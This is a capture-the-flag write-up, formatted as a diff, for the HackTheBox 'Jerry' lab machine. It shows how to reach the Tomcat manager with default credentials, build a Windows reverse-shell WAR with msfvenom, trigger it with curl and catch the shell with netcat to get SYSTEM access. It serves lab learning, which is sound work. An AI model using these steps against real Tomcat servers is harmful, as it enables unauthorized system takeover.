@@ -1,0 +1,42 @@
+HTB-Jerry-Writeup
+
+IP : 10.10.10.95
+
+Nmap 
+----
+- nmap scan shows one open port
+	- 8080 running Apache Tomcat
+
+Enumeration
+-----------
+- visiting port 8080 gives a default page for tomcat install
+- clicking around and trying default credentials 
+- the default credentials for tomcat works to get access to the tomcat manager application
+
+	creds : tomcat : s3cret
+
+- tomcat manager application provides the basic functionalty we need to manage our deployed web application
+- to get a shell out of this we can upload a war file using the WAR file to deploy option in the manager application page 
+- a web application resource file is a container that holds all the potential files necessary for a java based web application
+- it can have jar, jsp, servlets. java classes. webpages etc 
+- the /WEB-INF directory inside the archive contains a file called web.xml which defines the structure of the application 
+- tomcat makes it easy to deploy war files and since it contains java code its a great target for gaining execution
+- we can use msfvenom to generate a windows reverse shell that can be caught with nc 
+
+	msfvenom -p windows/shell_reverse_tcp LHOST=10.10.15.83 LPORT=9002 -f war > rev_shell-9002.war
+
+- we need to know the name of the jsp page to activate it with curl
+- we can use jar to list the contents of the war file or can unzip it
+
+	unzip -l rev_shell-9002.war
+	
+- after uploading we can acticate jsp by curling the page 
+
+	 curl http://10.10.10.95:8080/rev_shell-9002/ppaejmsg.jsp
+
+- start a listener with netcat
+	
+	nc -lnvp 9002
+
+- we got a shell as system 
+- grab the user and root flag 
